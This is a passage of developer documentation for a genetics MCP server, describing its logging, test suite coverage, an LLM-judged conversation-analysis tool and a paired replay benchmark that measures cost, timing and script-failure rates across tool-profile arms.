- **MCP Server (stdio)**: Uses standard Python logging to stderr (stdout reserved for MCP protocol)
- **MCP Server (SSE/HTTP)** and **Chat API**: Use GCP JSON logging to stdout
- **Log level**: Controlled by `LOG_LEVEL` env var (default `INFO`)
- **Noisy loggers suppressed**: `uvicorn.access`, `httpx`, `httpcore`, `urllib3`, `asyncio` are set to WARNING

**Cost logging**: Every Anthropic API call logs estimated cost based on model pricing and token usage (input, output, cache read, cache creation). A summary line is logged when the chat completes with total tokens and cost. Cost is logged even for secret chats. User email is included in all log lines. Subagent API calls also track token usage: `SubagentResult` includes `input_tokens` and `output_tokens` accumulated across all iterations, and an aggregated cost log line is emitted after `launch_subagents` completes.

Log levels:
- **INFO**: Server startup, tool registration, external server connections, API call cost
- **WARNING**: Fallback scenarios (e.g., Tavily→DuckDuckGo)
- **ERROR**: API failures, tool execution errors (with tracebacks)
- **DEBUG**: HTTP call details, SSE parsing

## Testing

Tests are in `tests/` using pytest with pytest-asyncio:

| Test file | Coverage |
|-----------|----------|
| `test_mcp_server.py` | MCP server initialization and tool registration |
| `test_chat_api.py` | FastAPI endpoints (status, tools, chat), including the reasoning opt-in: a default request does not set `capture_thinking` (the UI path is unchanged) and a request that does gets `thinking_summary` events with their iteration |
| `test_tools.py` | Tool executor methods |
| `test_executor_resilience.py` | Upstream-unreachable handling in `_ResilientAsyncClient` |
| `test_sandbox_client.py` | Sandbox transport against a stubbed HTTP layer (no sandbox, no credentials): the exact request field set, the tokens travelling in the body and never in a header, `execution_id` being the `jti` of both tokens, fail-closed on an unset signing key (nothing is sent), token redaction from logs and exception text (from `error.message` and from `error.type`, the latter asserted on `SandboxError.error_type` too), the result returned unchanged (including a failing script, which is a 200 and not an exception, and an unrecognised open-ended `error.type`), the 429 retry minting a **fresh** `execution_id`, `Retry-After` honoured and capped, `409 TokenExpired` retried immediately while `409 DuplicateExecutionId` is not retried at all, the read deadline clearing queue wait plus the full run, unreachable/`NotReady`/gateway failures separated from script failures, and the local pre-flight rejections, which cover every caller-supplied value the body carries (over-ceiling `timeout_s` rejected not clamped, empty or oversized `code`, an `execution_id` that is not §2's canonical uuid4, an empty `user` or `session_id` — all `SandboxRejected`, so a caller catching `SandboxError` cannot miss one) |
| `test_code_execution_tools.py` | The code-execution tool layer with no sandbox and no credentials: the SDK catalogue rendering (and what it does **not** disclose), `read_artifact`'s descriptor-based read and its path allow-list, and `run_analysis` against a stubbed transport — the fail-closed path reported as a non-retryable operator error with **nothing sent**, the handler's exception clauses asserted by AST so no `except Exception` can reappear above the named one, the 300 s turn budget (checked against the transport's own constants, not a copied number) reported as "may still be running" rather than as a script failure, each transport failure class kept distinct from a broken script, `execution_id` never reaching the model, a manifest rebuilt to name/size/content_type with paths and URLs dropped, an unknown `status`, an unknown `error.type` and unknown top-level fields all tolerated, and `llm_service` stripping a model-supplied `user`/`session_id` before injecting the authenticated pair |
| `test_db.py` | Database operations, LLM-config write transaction safety, LLM-config journal mode (WAL, and the reader/writer concurrency it buys), same-second tiebreak in the tool-description, user-setting and user-comment accessors (`changed_at`/`created_at` have one-second resolution, so the later `id` wins; both row orders, blank timestamps, several keys tied at once), and malformed-stamp reads (a NULL or unparseable `changed_at` degrades to the epoch in the singular and plural accessors alike rather than raising or dropping the key, and a group holding both a NULL and a sentinel stamp, `''` or `0` — the one shape that separates the `IS` join from a coalescing one — resolves to the same row in both, and the comment and tool-history reads degrade the same way), chat-history write transaction safety (every write accessor over a failed DML and a failed commit, the retained lock, and the multi-DML writes rolled back whole), and the zone the write path returns (the saves, the version history and `add_user_comment` hand back aware UTC, as the reads do) |
| `test_chat_history_router.py` | Chat history API |
| `test_llm_config_router.py` | LLM config API |
| `test_llm_config_db_migration.py` | One-shot import of legacy per-user instructions into instruction sets |
| `test_instruction_sets_db.py` | Instruction-set accessors: per-user scoping, write-time caps (including a concurrent-create race), over-cap rows reported not truncated, history, archiving, ordering, timestamp degradation, transaction safety (rollback on failure or on a failed commit, update racing an archive, update's read-modify-write under the write lock, reads never returning uncommitted rows) |
| `test_llm_service.py` | Replayed-history helpers: `tool_use`/`tool_result` pairing, marker stripping, cache breakpoint, truncation item counting |
| `test_stream_truncation.py` | The Anthropic streaming loop itself (the rest of the suite mocks `stream_chat` wholesale): `max_tokens` continuation, resuming a turn that presented unfilled results, the throttled contentless `thinking` keepalive, and the reasoning opt-in — no `thinking_summary` without `capture_thinking`, the summary emitted with its iteration when asked for, `redacted_thinking` emitting nothing, and thinking staying out of `message_content` in **both** cases so opting in cannot persist or replay it |
| `test_phewas_categories.py` | PheWAS category mappings |
| `test_subagent.py` | Subagent service, skills, sandbox tools |
| `test_variant_analysis.py` | Variant list analysis tool |
| `test_downloads.py` | Download store, TSV conversion, download endpoint, and the regression guard for silent download failures: every malformed `_download_data` payload (including verbatim reproductions of the `bef` and `buc` positional-rows payloads, and a non-`str` `filename`) must raise `DownloadShapeError` out of `_convert_to_tsv`, must never return quietly from `_process_download_hints`, and must there yield `DOWNLOAD_SHAPE_NOTE` plus a `DOWNLOAD_SHAPE_DEFECT tool=…` ERROR line with a traceback *without* propagating; a `TypeError` from the store still propagates (pinning the narrow `except`); `ENOSPC`, an unwritable storage path and an unencodable upstream value each surface `DOWNLOAD_FAILED_NOTE` plus a `DOWNLOAD_FAILED tool=…` ERROR line |
| `test_bigquery_gene_tools.py` | BigQuery-backed gene tools: the two result shapes (`results` named as dicts for the model, `_download_data` positional and actually round-tripped through `_convert_to_tsv` to prove the TSV has a header row), empty results, loud failure on a `columns`/row-arity mismatch, and the injection defence on the five methods that build SQL themselves (injected gene/resource/window rejected before the query is issued, legitimate symbols quoted, `limit` honoured by both the statement and the row cap) |
| `test_sql_safety.py` | Allow-list SQL literal validation: real gene/resource ids accepted, quote/backslash/semicolon/newline/NUL payloads rejected, numeric coercion and range checks |
| `test_sdk.py` | Genetics SDK: argument-shape dispatch for every collapsed function (gene vs variant vs region vs phenotype), refusal of ambiguous or empty shapes and of arguments the selected branch cannot honour, region parsing, DataFrame return contract (positional db-api rows named from `columns`, empty results keeping their schema), `GeneticsError` on failure and on truncation, `limit` defaulting to the row ceiling, the row cap being lifted only on executors the client builds, `configure()` refusing to redirect the authenticated client, phenotype/dataset/gene-symbol lookups, the sync facade, and a subprocess check that importing the SDK pulls in no chat-backend module |
| `test_gene_group_tools.py` | Gene group membership and symbol normalization |
| `test_literature_search.py` | Literature backend selection, Perplexity metadata hydration |
| `test_myvariant.py` | myvariant.info annotation tool |
| `test_uniprot.py` | UniProt client: resolution tiers, TTL cache, variant effect |
| `test_temperature.py` | Temperature off by default, model-specific rejection (`model_rejects_temperature()`) |
| `test_analyze_conversations.py` | Conversation analysis: parsing, categorization, metrics, eval export |
| `test_conversation_analysis_db.py` | Conversation analysis cache tables, upsert idempotency, staleness selection |
| `test_analysis_timeseries.py` | Rolling-window series aggregation |
| `test_admin_router.py` | Admin router endpoints, auth guards, DB methods |
| `test_cost.py` | Cost estimation and context window lookup |
| `test_replay_benchmark.py` | Replay harness: SSE/usage parsing, the discarded pre-answer prose kept with the call it followed, `--capture-thinking` (not requested by default, recorded against the iteration the stream names, falling back to the usage count when it names none), paired ordering, matched-pair analysis, tool_result replay, percentiles, error handling, and the per-call metadata taken from the stream's ordering rather than the `done` chunk — a call is attributed to the iteration whose `usage` chunk preceded it, `run_analysis` carries the sandbox's own clock, and arguments still come from the `done` chunk because `llm_service` rewrites the copy it streams (all over a local stub SSE server) |
| `test_arm_resolution.py` | Preflight that aborts on an unknown `tool_profile` rather than silently falling back to `{"general"}`, and records each arm's resolved tool list in the report |
| `test_tool_call_detail.py` | The call listing is complete, in emission order, keeps arguments untruncated, and does not count display prose imitating a tool marker |
| `test_benchmark_scorecard.py` | The scorecard never presents an arm that fell over as cheaper or faster: uncomparable cases are excluded from the totals with a reason, interval-priced cost is marked, an unpriced model is not reported as free, and a rate-limited run is called out before any number is read. For `--markdown`: a script is reproduced whole where the column views elide it, a fence outgrows backticks inside the value it wraps, discarded prose and absent tool results are declared, an uncomparable case still shows why its arm failed, and an unknown `--case` returns the refusal `main()` exits non-zero on. Per-arm output: a one-arm file holds only that arm yet still states the pair's comparability, keeps the question when only the other arm recorded it, refuses an unknown arm, and `main()` writes `FILE.<arm>.md` beside the paired file |
| `test_benchmark_transcript.py` | The side-by-side transcript carries what distinguishes a *wide* arm from a *slow* one (per-call iteration, retry loops, script shapes) and never invents a measurement it lacks — an unattributed call has no iteration, and the final iteration's absent tool phase is not reported as a gap |
| `test_pairwise_judge.py` | Blind pairwise judging (every judge call goes through a fake client — the suite never spends money): the arm cannot reach the prompt (no arm name, no tool trace, only the shared *user* turns as context), both presentation orders are actually used and seeded reproducibly across processes, a position-biased judge scores no wins, a failed call leaves the pair `unresolved` and does not pay for a second call, the exact sign test and the `MIN_DECISIVE_PAIRS` power rule (no p-value **and no win rate** below it, in the printed report *and* in every restricted table in the saved JSON), and the harness's own distortions being visible per arm rather than assumed even-handed: characters the answer-slicing rule discarded (and `dropped_prose_blocks` returning that same text with the call it followed, for the transcript and never for the judge), length measured on the text **as shown** to the judge rather than raw, per-arm truncation and provenance-marker counts, and pairs with an unextracted answer getting their own restricted table instead of scoring as losses |

Run tests:
```bash
pytest
pytest --cov=src/genetics_mcp_server  # with coverage
```

`pytest-randomly` (pinned to 4.1.0 in the `dev` extra) shuffles test order on every run, so
order-dependent state leaking between tests fails visibly instead of hiding behind the
collection order. The seed is printed in the pytest header; reproduce a failure with
`pytest --randomly-seed=<seed>`, or take the collection order out of the picture with
`pytest -p no:randomly`. The pin is deliberate — the seed-to-order mapping is not stable
across plugin versions, so a seed quoted in a bug report only means something at one version.

## Conversation Analysis

`scripts/analyze_conversations.py` is an offline tool that reads the chat-history
SQLite DB, persists per-conversation analysis results back into that DB (the
`conversation_analysis` / `conversation_issue` tables), and produces a markdown
report (`report.md`) plus an eval dataset. With `--output-dir` it also writes a
local-dev `metrics.json` (consumed by `plot_conversation_scores.py` for
quality-over-time plots).

Its quality judge scores **one conversation at a time, absolutely**, which is the right
instrument for sampling and for tracking quality over time and the wrong one for
comparing two arms' answers to the same question — see *Paired Quality Judging* below,
which is a separate instrument over the replay benchmark's own transcripts and does not
read this DB.

- **Eval export** (`export_eval_dataset()` → `eval_dataset.json`) picks representative
  conversations per topic and, besides the display transcript (`turns`, capped at 2,000
  chars per message), emits `user_turns`: every user turn of the session in order, with
  untruncated content and the options in force at that turn (`verbosity`, `tool_profile`,
  `instruction_set_id`, `literature_backend`). This is what makes a multi-turn replay
  possible — `first_user_message` alone only reproduces the opening. **Each row's own
  values are the options in force at that row, nulls included**: the browser sends all
  four keys on every `saveMessage` and `add_message` stores exactly what the request
  carried, so a null is a recorded choice rather than a gap — `tool_profile IS NULL`
  specifically means "all tools" (`build_anthropic_tools` applies no category filter
  when it is `None`). Carrying the last non-null value forward would export a user who
  switched back to all-tools as still running the previous profile. The one exception
  is a row on which **all four** columns are null, which cannot have been written by
  the current client and so predates the wiring; there the previous turn's settings
  carry forward. Message order uses `message_sort_keys()` — `(created_at, rowid)`,
  because `created_at` has one-second resolution and a user turn routinely shares a
  second with its reply. All previously exported keys are retained.
- **Models** (env-overridable): both topic classification (`$ANALYZE_TOPIC_MODEL`)
  and the quality judge (`$ANALYZE_QUALITY_MODEL`) default to Opus 5.
  CLI flags `--topic-model` / `--quality-model` override the env defaults.
- **Thinking is off** on every analysis call (`thinking_off_kwargs()`): the output is
  a JSON object, so reasoning tokens only add cost and latency. Opus 5 thinks by
  default, so opting out has to be explicit — and Fable/Mythos reject the opt-out,
  hence the model check. Responses are read with `response_text()`, which
  concatenates the `text` blocks instead of indexing `content[0]` — a thinking-capable
  model leads with a `ThinkingBlock` that has no `.text`, which is what broke the
  nightly job when it moved to Opus 5.
- **LLM-as-judge** evaluates each conversation. The judge is given today's date and
  is told it cannot see raw tool output, so it must not flag real (precise, recent)
  data as fabricated. Attachments (stored only in a message's `content_json`) are
  surfaced to the judge so file-based questions aren't mistaken for fabrication.
- **Disposition** classifies each conversation's outcome: `good_answer`,
  `agent_failure`, `technical_failure`, `out_of_scope`, `unfinished`,
  `weird_or_unclear`. Only `good_answer`/`agent_failure` count toward the
  **agent-quality** metric (successful/neutral/unsuccessful). `technical_failure`
  keeps a low score but buckets separately (infra ≠ agent); out-of-scope / unfinished
  / weird requests are not penalized. This keeps the quality trend measuring only
  conversations the agent could have done well at. Conversations the judge skipped
  (no quality score) and with no user rating are labelled `unknown` rather than given
  a heuristic label, so they stay out of the quality metric.
- **Tool-call counting** comes from the `tool_use` blocks in `chat_messages.content_json`,
  which is the real record of what the model called. The `*[Using tool: X]*` markers in
  `content` are display prose — injected for the UI and stripped from replayed history by
  `_strip_tool_use_markers` — so they are only a fallback, used for rows that carry no
  block list at all (history predating the `content_json` migration).
  `parse_tool_calls_from_content_json()` returns `None` for such rows and `[]` for a row
  that was recorded and called nothing, which is what keeps the fallback in
  `message_tool_calls()` targeted instead of silently preferring one source. Malformed
  or non-list `content_json` degrades to `None` rather than raising: the column is
  client-supplied and one bad row must not fail a run over thousands.
- **Counting coverage is reported alongside every tool aggregate.** `build_tool_coverage()`
  returns a per-session provenance frame plus a `ToolCountCoverage` summary (assistant
  messages and tool calls per source, sessions fully covered by `content_json`). A session
  with even one marker-counted assistant message gets
  `ConversationMetrics.tool_count_is_lower_bound`, the report prints a **Counting coverage**
  block under Tool Usage Patterns, and every tool aggregate carries an explicit
  lower-bound caveat when any session is not fully covered; per-session counts render as
  `>=N` wherever the session's flag is set. This exists so a tool-count aggregate is never
  quoted — or benchmarked against — as if it were a total. Note that full coverage is not
  the same as completeness: the browser also persists partial `content_json` when a stream
  is interrupted (`LLMChat`'s `partialMsg` path), so a present block list may be truncated
  at the point the stream died while still counting as fully covered. An empty frame is
  reported as "no assistant messages" rather than exact.
- **Issue categorization**: the judge's detailed per-conversation issues are mapped
  onto a fixed taxonomy (`conversation_prompts.py:ISSUE_CATEGORIES`) via a separate
  cheap pass (batched, on the topic model) so the report surfaces recurring problems
  instead of count-1 unique strings.
- **Caching**: per-session topic + quality + derived results are persisted to the
  `conversation_analysis` / `conversation_issue` SQLite tables (with the full
  `ConversationMetrics` blob in `metrics_json`) and read back via `get_analysis_map`
  so already-analyzed sessions skip the LLM. A session is treated as cached only if
  its row's `analyzer_version` equals the module-level `ANALYZER_VERSION` (bumping
  that constant invalidates every cached analysis). `source_updated_at` is stored as
  the raw `chat_sessions.updated_at` string so staleness comparisons stay consistent.
- **Staleness-based selection**: the nightly run does minimal LLM work by asking the DB
  (`get_stale_or_missing_session_ids`) which in-range sessions actually need (re)analysis —
  ones with no row, a continued conversation (`chat_sessions.updated_at` advanced past
  `conversation_analysis.analyzed_at`), or an `analyzer_version` mismatch. Only those are
  evicted from the reconstructed topic/quality cache and sent to the LLM; unchanged,
  current-version sessions are skipped but still flow into the report (the report always
  aggregates the full in-range set, cached + freshly judged). `--start-from` / `--until`
  intersect with the stale set as an additional date filter. Because `upsert_analysis`
  writes `analyzed_at = CURRENT_TIMESTAMP`, a re-judged continued conversation is no
  longer stale on the next run (a future `updated_at` would correctly stay stale).
  After changing the judge prompt or scoring, re-run with `--refresh-quality`
  (re-judge, keep topic cache), `--no-cache` (recompute all), or `--force` (reanalyze
  every conversation from scratch — a superset of `--no-cache` for the selected range;
  `--force` wins over `--refresh-quality` since it recomputes topics too). The issue text →
  taxonomy-category map remains a small flat sidecar at `<output-dir>/.cache/issue_categories.json`.

## Replay Benchmark

`scripts/replay_benchmark.py` replays the `user_turns` sequences from
`eval_dataset.json` through `POST /chat/v1/chat` under two `tool_profile` arms and
reports per-arm distributions. It is the measurement gate for the code-execution
epic (`genetics-results-suite-4h6`): a candidate arm has to beat the recorded
baseline before it is defaulted on.

**Running it costs real money** — production averaged $2.01 per turn, and the
harness issues two arms per case. `--base-url` therefore defaults to
`http://localhost:8000`, never a deployment, and `--dry-run` resolves the whole plan
(case order, arm order, turn count) without issuing a single request.

- **Paired design.** Both arms of a case run back to back inside one worker, so a
  model swap or an API slowdown mid-run hits both arms equally. `--concurrency`
  parallelises over *cases*; the semaphore is held for the whole case, so the two
  arms of one case never overlap. Case order is deterministic (sorted on
  `session_id`) and the arm order alternates by case index — even cases run
  (A, B), odd cases (B, A) — so the second-position warm-cache advantage does not
  accrue to one arm. The order actually used is recorded per case in the report.
- **The analysis is matched, because the design is paired.** The headline
  distributions (`report["matched"]`) cover only the `(case_id, turn_index)` pairs
  that came back `ok` on *both* arms. Summarising each arm's own `ok` turns
  independently would reward an arm for failing: `replay_case_arm` aborts only the
  failing arm, so an arm that dies on the hard, late, expensive turns keeps just its
  cheap early ones while the healthy arm carries the full tail, and its
  iterations/cost/latency medians drop *because it failed*. The per-arm marginals are
  still reported (`report["per_arm"]`) but printed under an explicit "UNMATCHED
  MARGINALS — not comparable across arms" heading, and the summary states how many
  `ok` turns each arm contributed that the other arm did not.
- **Replayed history carries the tool results.** The `done` chunk's `tool_results`
  are appended after the assistant message as `{"role": "user", "content":
  tool_results}` — exactly what the browser does (`LLMChat.tsx`) and what
  `llm_service` itself does inside the agentic loop. Without them
  `_sanitize_tool_blocks` strips every `tool_use` block of the replayed assistant
  turn as orphaned, so from turn 2 on the model would see an assistant that answered
  out of thin air. That matters more here than anywhere else: tool results are the
  bulk of the context growth the benchmark exists to measure (median 39k → 117k
  tokens across a conversation), and the loss is asymmetric — the arm calling more or
  larger tools loses more context, compressing the measured gap between arms.
- **Metrics come off the SSE stream, not the database.** Every request carries
  `secret=true` (a benchmark must not write into a user's history), and secret chat
  deliberately writes no `chat_turn_metrics` row, so the DB is not an option — see
  the `chat_turn_metrics` section. `llm_service` yields a `usage` chunk per model
  roundtrip; the harness reads `iteration`, per-iteration `input_tokens`,
  `cache_read`, `cache_create`, `output_tokens`, `total_input_tokens`,
  `total_output_tokens`, `context_percent`, `turn_elapsed_ms` and `model_ms` from it,
  and takes the tool-call count from the `done` chunk's `message_content` by counting
  real `tool_use` blocks (never the `*[Using tool: …]*` display markers, which the
  model has been observed to imitate as prose).
- **The prose the answer-slicing rule discards is recorded too, with its position.** Every
  turn keeps `final_answer_dropped_prose` — `{after_call, text}` per block — alongside the
  `final_answer_dropped_chars` count, from the same boundary (`dropped_prose_blocks`, beside
  `final_answer_split`, so the two cannot disagree about what was dropped). Always captured,
  no flag: it is the model's own **visible** output, it is small next to the tool arguments
  already in the report, and without it the transcript could only apologise for a missing
  table while presenting the remainder as the whole reply. It is for the reader alone — the
  judge is still shown `final_answer` only, since this half is running commentary about
  tools and scripts and names the arm on sight.
- **`--capture-thinking` records the model's reasoning, and nothing else changes.** Off by
  default. When set, the request carries `capture_thinking: true`, `llm_service` emits a
  `thinking_summary` chunk per reasoning iteration, and each turn keeps them in
  `thinking_detail` (`{iteration, text}`) for `benchmark_scorecard --markdown` to show
  beside the calls they produced. It is a run-level flag rather than a per-turn option
  because it changes what the stream carries, not what the model is asked — no metric moves
  either way, since thinking tokens are already inside `output_tokens` and are billed
  whether or not the summary is returned. The cost is report size, which is why it is opt-in.
  What is recorded is the **summary**: `display: "summarized"` is what the deployment asks
  for, and the raw chain of thought is exposed by no model. The judge is never shown it —
  reasoning names tools and scripts outright, and would identify the arm at once. A server
  that predates the field ignores it and the run records nothing rather than failing.
- **The `usage` chunk's `input_tokens` is the whole context**, i.e.
  `input_tokens + cache_read + cache_creation`, while `total_input_tokens`
  accumulates only the billed uncached input. `cached_input_tokens` is therefore
  derived as `sum(per-iteration input_tokens) - total_input_tokens`.
- **Cost is exact when the stream carries the cache split, and an interval when it
  does not — and the report says which.** Cache reads and cache creations differ by
  more than 12x in price, so the sum alone can only be bracketed. Since
  `genetics-results-suite-n3p` the `usage` payload reports `cache_read` and
  `cache_create` separately, and the harness prices the three token classes
  separately into `cost_usd` (`cost_basis: "exact"`). `cost_usd_min` / `cost_usd_max`
  are still computed as the fallback bracket and as a sanity range the exact figure
  must sit inside. A turn is priced exactly only when **every** one of its `usage`
  chunks carried the split; one chunk without it demotes the whole turn to
  `cost_basis: "interval"` with `cost_usd = null`, because a turn priced exactly in
  part and by assumption in the rest is a mixed number wearing an exact label. The
  per-arm summary counts turns by basis and the printed footer states how many turns
  are exact and how many only bracketed, so a mixed run cannot be read as if
  `cost_usd` covered all of it. Pricing also needs a model name the pricing table
  actually knows: without `--model`, *or* with a model `cost.has_pricing()` cannot
  match (`gpt-4o`, a transposed `claude-4-opus`), the USD fields are `null`
  ("not priced", `cost_basis: "unpriced"`) with a warning, not `0` and not silently
  priced at the `_match_pricing` Sonnet fallback.
- **Per-iteration timing localises a slow turn.** `ms_to_first_token` and
  `ms_to_done` are per *turn* and cannot say which roundtrip was slow, which matters
  because context roughly triples between iteration 1 and 7+. The `usage` chunk
  therefore carries two timings, each named for its epoch:
  `turn_elapsed_ms` is **cumulative from the start of the turn** (the same monotonic
  zero as `chat_turn_metrics.wall_ms`), sampled when that iteration's model response
  completed; `model_ms` is that iteration's model call, retry backoff and SSE
  delivery included — it is deliberately *not* labelled model latency, and
  `model_attempts` rides beside it so a retry-inflated reading is identifiable.
  Everything else is derived rather than guessed:
  - `segment_ms` is the difference between consecutive `turn_elapsed_ms` (first
    iteration measured from 0). It is named for its **epoch**, not for an iteration,
    because it is not one: it is `model_ms[N]` plus the tool phase of `N-1`.
  - `pre_model_ms` is `segment_ms - model_ms` — the turn's setup for iteration 1 and
    the *previous* iteration's tool phase thereafter, since the chunk is emitted
    before any tool of its own iteration runs.
  - `tool_phase_ms` re-attributes that span to the iteration whose tools it was
    (`null` on the last iteration, which answered). On the `max_tokens`
    *continuation* path the same span is continuation bookkeeping rather than tool
    time; read it as "what happened between the two model calls".
  - `iteration_ms` is that iteration's own **roundtrip**, `model_ms[N] +
    tool_phase_ms[N]`, so the printed row sums and `slowest_iteration` names the
    roundtrip a reader should go and look at. Deriving it from `segment_ms` (as it
    was before) charged iteration N with iteration N-1's tools — already printed on
    row N-1 — and named the bottleneck one roundtrip too late, which is precisely the
    localisation the field exists to provide. It is `null` whenever either half is
    unmeasured, rather than topping up an unobserved tool phase with `0`.
    The **last** iteration is two cases and only one of them is an absence.
    `llm_service` leaves the loop after a `usage` chunk in exactly four ways: no
    `tool_use` blocks, the `max_tokens` continuation budget exhausted, the
    unfilled-result continuation budget exhausted, or the iteration ceiling. The
    first three ran **no tools**, so that iteration's tool phase is a measured
    **zero** and `iteration_ms` is `model_ms`. Only the ceiling ran tools whose phase
    no following model call ever closed, and reaching the ceiling is exactly what
    appends the `Max tool iterations reached` notice — so tools-after-the-last-usage-
    chunk implies the marker, and there is no false negative from the server. The
    harness therefore imputes the zero only for turns that are `ok` **and** carry no
    marker; an error or timeout mid-turn can land after tools ran with no marker and
    no `done`, and a false *positive* (a model quoting the text back, or the ceiling
    reached on a turn that then answered without tools) yields `null`, the safe
    direction. Collapsing both cases into `null` would drop every single-iteration
    turn — ~36% of production turns — out of `slowest_iteration_ms` and make a slow
    final roundtrip, the one answering against the largest context (median 39k → 117k
    tokens by iteration 7+), structurally invisible. The marker text is a constant in
    `llm_service` (`MAX_ITERATIONS_NOTICE`) and a deliberately separate literal in the
    harness (`MAX_ITERATIONS_MARKER`, since it parses a *remote* server's stream),
    pinned to each other by a test so a rename fails loudly rather than silently
    mis-timing final iterations.
    `tool_phase_ms` stays `null` in **both** cases even though the first one's is
    zero: that column means "a tool phase that was measured", and seeding it with one
    `0` per turn would drag every by-index median toward zero for a reason unrelated
    to how long tools take.
  A **gap** breaks the timeline rather than being papered over: an untimed `usage`
  chunk resets the baseline, so the *following* iteration reports `null` instead of a
  segment silently spanning two iterations (which would also misname
  `slowest_iteration`). That is the same standard the cost path applies when one
  chunk lacks the cache split.
  The per-turn record adds `model_ms_total`, `slowest_iteration`,
  `slowest_iteration_ms` and `iterations_with_model_retries`; the per-arm summary
  adds `iteration_timing`, a distribution over all iterations plus the same broken
  out by iteration index, printed as a timeline table. That table prints **one `n`
  per column**, not one per row — `tool_phase_ms` is `null` for every turn that ended
  at that index, so its sample is strictly smaller than `model_ms`'s at the same
  index — and marks any percentile `distribution()` already flagged as unreliable
  with a `*`, matching the rest of the report. A field the stream did not carry stays
  `null` and is excluded from the distributions rather than imputed as `0`.
  Per-*tool* timing is deliberately not here (`genetics-results-suite-4h6.73` fix 3):
  tools are gathered concurrently with `asyncio.gather`, so per-tool wall times
  overlap and do not sum to the iteration's tool phase.
- **A turn that reaches `done` without a single `usage` chunk is `no_usage_chunks`,
  not `ok`.** Iterations, tokens and cost are all unmeasurable for it, so counting
  its (necessarily zero) `tool_use` blocks would push a fake `0` into the tool-call
  distribution while contributing nothing to any other, diverging the two samples'
  `n` and dragging the tool-call median down. This is not hypothetical: the OpenAI
  path in `llm_service` yields one synthetic text block with no usage chunk and no
  tool_use blocks, so a deployment whose `default_provider` is OpenAI would report
  `tool_calls=0` for every turn. `--provider` pins the provider on the request and is
  recorded in the report config. The history stays intact, so the rest of the case
  still runs; it is the status, not an abort, that keeps the turn out of the
  comparison.
- **`--timeout` is a wall-clock deadline per turn**, enforced with
  `asyncio.timeout` around the whole stream. httpx's timeout is per *read*, and
  `sse_starlette` sends a keepalive comment every 15s that the parser drops silently
   — each one resets a read timeout, so a wedged generator could stream keepalives
  (and burn money) indefinitely without ever tripping it.
- **Distributions, not medians.** Every metric is reported as n / mean / p25 / p50 /
  p75 / p90 / p95 / max, because the production distribution is tail-weighted
  (iterations median 2 but p95 8, max 25). A percentile is flagged
  `unreliable at n=<n>` whenever `n * (1 - p) < 1`, i.e. when the sample has no
  observation above it and the "percentile" is just the maximum: p25 and p50 need
  n≥2, p75 n≥4, p90 n≥10, p95 n≥20. The threshold is computed as
  `ceil(100 / (100 - p))`, not `ceil(1 / (1 - p/100))` — the latter makes p90's
  threshold 11 because `1 - 0.9` is `0.09999999999999998` in binary floating point.
  The human summary states N and warns outright below 10 cases.
- **Failures are counted, never dropped.** A turn that errors, times out or hits an
  unreachable target is recorded with its status and message; the remaining turns of
  that case *and that arm only* are recorded as `not_attempted` (the history is
  broken, so they cannot be replayed under comparable conditions). The other arm and
  every other case continue. A whole case that raises out of the worker emits one
  `error` record per `(arm, turn_index)` over its planned turns, in that case's
  alternated arm order — not two `turn_index=0` records, which would under-report
  `turns_attempted` and hide the loss from the per-status table.
- **Script-failure and retry-loop counters read the `script_result` chunk.**
  A code-execution arm scores ~1 tool call by construction, so tool-call count alone
  is a dishonest win condition; the counters exist to price the failure modes that
  offset it. `llm_service` emits one `script_result` chunk per completed
  `run_analysis`, carrying `iteration`, `ran`, `ok`, `status`, `timed_out`,
  `exception`, `limit` and `duration_ms` — metadata only; the script's source and
  output travel in the `tool_result`, not on this chunk. **There is no `exit_code`**:
  the sandbox supervisor answers with a `status` of `ok` / `error` / `timeout` /
  `limit`, so an exit code would be invented rather than measured. `ok` is the
  outcome field.
  **Classification keys on `status`, not on `ran`.** `ran: false` says only that the
  sandbox did not execute the script; it does not say whose fault that was, and
  reading it as "infrastructure" flatters the code arm on the very metric that exists
  to price its characteristic risk. `EmptyScript` (blank or non-string `code`) and
  `SandboxRejected` (a model-chosen `timeout_s` outside 1..120, or oversize code)
  arrive with `ran: false` and are the **model's** doing, so they are counted as
  script failures, in both the numerator and the denominator. Left in the
  infrastructure bucket they produced the exact inversion of the truth: a model
  asking for `timeout_s: 300` twice per case reported
  `failures=0 rate=0.000, sandbox faults=2N`, and a reader concluded the scripts
  never fail and the sandbox is flaky. Genuine faults — restarting sandbox, full
  queue, unminted signing key — stay in `script_infra_errors`, outside the rate, so a
  deploy landing mid-run cannot decide the rollout.
  Every distinct shape is also reported verbatim and individually in
  `script_outcomes`, and the rate is printed with its numerator and denominator
  spelled out beside it:
  `script_failure_rate = (executed_failed + model_rejected) / (executed_ok +
  executed_failed + model_rejected)`. That is what settles `TurnBudgetExceeded`,
  which two reviewers classified in opposite directions — the ~300 s turn budget
  against the sandbox's own 120 s `MAX_TIMEOUT_S`, so a single script cannot trigger
  it. Rather than picking a side invisibly it gets its own bucket
  (`script_budget_exceeded`), in *neither* the numerator nor the denominator, and a
  reader who classifies it differently can redo the arithmetic from numbers already
  on the page.
  A **retry loop** is any non-successful script outcome followed by a further `usage`
  chunk, i.e. a wasted model roundtrip at full context — counted at most once per
  iteration, since two scripts failing in the same iteration still cost exactly one
  extra roundtrip, and not at all when the failure was the turn's last iteration.
  Because the causes are not the same kind of fact, the count is split into
  `retry_loops_script`, `retry_loops_disputed` and `retry_loops_infra` (summing to
  `retry_loops`), attributed by precedence script > disputed > infra so a wasted
  roundtrip is never credited to the platform when the model's own script also
  failed. It over-counts in one known way, in the safe direction: if one of two
  *parallel* scripts fails while the other succeeds, the next roundtrip is booked as
  a retry loop even though the model may simply be consuming the successful result.
  That penalises the code arm, so it is left rather than guessed at.
  An arm that emitted no `script_result` chunk at all reports `null` and prints
  `NOT MEASURED` with the reason, deliberately *not* `0`, which would read as
  "measured, no failures" — expected for an arm whose profile has no code-execution
  tool. The `NOT MEASURED` branch keys on `script_runs is None`, never on
  `script_failure_rate is None`: the rate is also `None` for an arm that *was*
  measured and ran zero scripts, and printing that as unmeasured would defeat the
  whole point of distinguishing the two states.
  The SSE dispatch in `chat_api.py` is an `if/elif` chain with no default, so the
  chunk needs an explicit branch there; without it `llm_service` would emit it
  perfectly well and the harness would still print `NOT MEASURED`.
- **Every `ok` turn also records `user_question` and `final_answer`**, the two things
  the quality judge below needs. `final_answer` is the text blocks *after the last
  `tool_use` block* of `message_content` — what the user is left with, not the running
  commentary and not the tool trace. `user_question` comes from the replayed dataset
  and is therefore identical on both arms, which is what makes a pair a pair. They are
  in the report so a saved run can be judged later without replaying anything.
